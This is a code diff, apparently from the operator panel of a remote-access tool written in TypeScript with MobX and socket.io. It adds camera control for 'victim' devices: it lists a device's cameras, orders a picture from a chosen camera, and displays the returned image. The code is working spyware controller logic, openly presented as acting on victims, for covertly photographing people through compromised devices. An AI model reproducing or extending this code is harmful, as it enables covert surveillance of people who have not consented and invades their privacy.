@@ -2,13 +2,21 @@ import { action, makeObservable, observable } from 'mobx';
 import { io, type Socket } from 'socket.io-client';
 
 import { SOCKET_NAMESPACE_DEVICE } from '../../common/constants';
-import { ConnectionStatus, type VictimStatus } from '../../common/enums';
 import {
+    ConnectionStatus,
+    ServerToVictimEvents,
+    VictimOrder,
+    type VictimStatus,
+} from '../../common/enums';
+import {
+    type CameraItem,
+    type CameraOrderPayload,
     type IBaseEntity,
     type IServerToVictimEvents,
     type IVictim,
     type IVictimToServerEvents,
 } from '../../common/interfaces';
+import { bufferToDataUrl } from '../utils/Common';
 
 export class VictimDeviceStore implements IBaseEntity, IVictim {
     public id: string;
@@ -30,6 +38,8 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
     public connectionStatus: ConnectionStatus = ConnectionStatus.DISCONNECTED;
     public open: boolean = false;
+    public cameras: CameraItem[] = [];
+    public imageDataUrl: string | null = null;
 
     public constructor(input: IBaseEntity & IVictim) {
         this.id = input.id;
@@ -55,9 +65,14 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
         this.setupListeners();
 
         makeObservable(this, {
+            cameras: observable,
             connectionStatus: observable,
+            imageDataUrl: observable,
             open: observable,
+            setCameras: action,
+            setImage: action,
             setOpen: action,
+            setConnectionStatus: action,
         });
     }
 
@@ -106,10 +121,42 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             this.setConnectionStatus(ConnectionStatus.ERROR);
             console.log(`[VICTIM] Device ${this.deviceId} reconnect failed`);
         });
+
+        this.socket.on(VictimOrder.CAMERA, (data: CameraOrderPayload) => {
+            console.log(`[VICTIM] Device ${this.deviceId} camera data`, data);
+
+            if (data.camList === true) {
+                this.setCameras(data.list);
+            } else if (data.image) {
+                this.setImage(Buffer.from(data.buffer));
+            }
+        });
     }
 
-    private setConnectionStatus(connectionStatus: ConnectionStatus): void {
+    public listCameras(): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.CAMERA,
+            extra: 'camList',
+        });
+    }
+
+    public takePicture(cameraId: number): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.CAMERA,
+            extra: cameraId,
+        });
+    }
+
+    public setCameras(cameras: CameraItem[]): void {
+        this.cameras = cameras;
+    }
+
+    public setConnectionStatus(connectionStatus: ConnectionStatus): void {
         this.connectionStatus = connectionStatus;
+    }
+
+    public setImage(image: Buffer | null): void {
+        this.imageDataUrl = image !== null ? bufferToDataUrl(image) : null;
     }
 
     public setOpen(open: boolean): void {
